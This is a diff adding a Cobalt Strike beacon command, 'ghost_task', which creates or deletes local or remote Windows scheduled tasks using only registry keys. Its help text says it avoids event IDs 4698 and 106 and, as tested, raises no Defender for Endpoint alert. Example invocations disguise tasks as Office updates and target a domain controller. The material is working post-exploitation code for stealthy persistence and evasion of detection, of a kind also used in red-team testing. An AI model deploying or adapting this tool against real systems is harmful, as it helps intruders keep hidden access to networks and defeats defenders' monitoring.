@@ -1485,3 +1485,98 @@ Note:    nettime will return the time of the localhost if target is null
 "
 );
 
+# ghost_task localhost add demo "cmd.exe" "/c notepad.exe" LAB\Administrator weekly 14:12 monday,thursday
+# ghost_task localhost add "Microsoft\Office\Office Automatic Updates 2.0" "cmd.exe" "/c notepad.exe" LAB\employee001 daily 20:37
+# ghost_task DC01.lab.corp add demo "cmd.exe" "/c notepad.exe" LAB\Administrator daily 15:19
+# thx L.N.
+alias ghost_task
+{
+    local('$arglen $hostname $operation $taskname $program $argument $username $scheduletype $time $day $args');
+    $bid = $1;
+    $arglen = size(@_);
+    if ($arglen == 1) {
+        berror($bid, "No computer name (e.g., localhost/remote server hostname) provided.\n");
+        return;
+    } else if ($arglen == 2) {
+        berror($bid, "No reg task operation (e.g., add/delete) provided.\n");
+        return;
+    }
+    $hostname = lc($2);
+    $operation = lc($3);
+
+    if($operation eq "add")
+    {
+       if ($arglen < 8) {
+            berror($bid, beacon_command_detail("ghost_task"));
+            return;
+       }
+       $taskname = lc($4);
+       $program = lc($5);
+       $argument = lc($6);
+       $username = lc($7);
+       $scheduletype = lc($8);
+       if($scheduletype eq "weekly") {
+            $time = lc($9);
+            $day = lc($10);
+            $args = bof_pack($bid, "izzzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time, $day);
+       }
+       else if ($scheduletype eq "second") {
+            $time = lc($9);
+            $args = bof_pack($bid, "izzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time);
+       }
+       else if ($scheduletype eq "daily") {
+            $time = lc($9);
+            $args = bof_pack($bid, "izzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time);
+       }
+       else if ($scheduletype eq "logon") {
+            $args = bof_pack($bid, "izzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype);
+       }
+       else {
+            berror($bid, "Unknown schedule type.\n");
+            return;
+       }
+    }
+    else if($operation eq "delete")
+    {
+        if ($arglen < 4) {
+            berror($bid, beacon_command_detail("ghost_task"));
+            return;
+        }
+        $taskname = lc($4);
+        $args = bof_pack($bid, "izzz", $arglen, $hostname, $operation, $taskname);
+    }
+    else
+    {
+        berror($bid, beacon_command_detail("ghost_task"));
+        return;
+    }
+    beacon_inline_execute($bid, readbof($bid, "ghost_task"), "go", $args);
+}
+
+beacon_command_register(
+    "ghost_task",
+    "Create or modify a local or remote scheduled task, without triggering Windows events 4698 and 106.",
+    "
+Command: ghost_task
+Summary: Create or modify a local or remote scheduled task, without triggering 
+         Windows events 4698 and 106.         
+Usage:   ghost_task <hostname/localhost> <operation> <taskname> <program> <argument> <username> <scheduletype> <time/second> <day>
+         - hostname/localhost: Remote computer name or localhost.
+         - operation: add/delete
+           - add: Create or modify a scheduled task using only registry keys. Requires restarting the Schedule service to load the task definition.
+           - delete: Delete a scheduled task. Requires restarting the Schedule service to offload the task.
+         - taskname: Name of the scheduled task.
+         - program: Program to be executed.
+         - argument: Arguments for the program.
+         - username: User account under which the scheduled task will run.
+         - scheduletype: Supported triggers: second, daily, weekly, and logon.
+         - time/second (applicable for 'second', 'daily', and 'weekly' triggers):
+           - For 'second' trigger: Specify the frequency in seconds for task execution.
+           - For 'daily' and 'weekly' triggers: Specify the exact time (e.g., 22:30) for task execution.
+         - day (applicable for 'weekly' trigger): Days to execute the scheduled task (e.g., monday, thursday).
+Note:    As of October 21, 2023, this tool has been tested on Windows 10, Windows Server 2016, 2019, and 2022
+         As of October 21, 2023, no alert and no scheduled task creation event (ScheduledTaskCreated action type) will be generated in MDE (Microsoft Defender For Endpoint)
+         To create a scheduled task using this tool, NT AUTHORITY/SYSTEM privileges are required
+         After configuring the scheduled task, you'll need to either restart the system or await the next reboot for the task to be loaded into the Schedule service process and subsequently executed
+"
+);
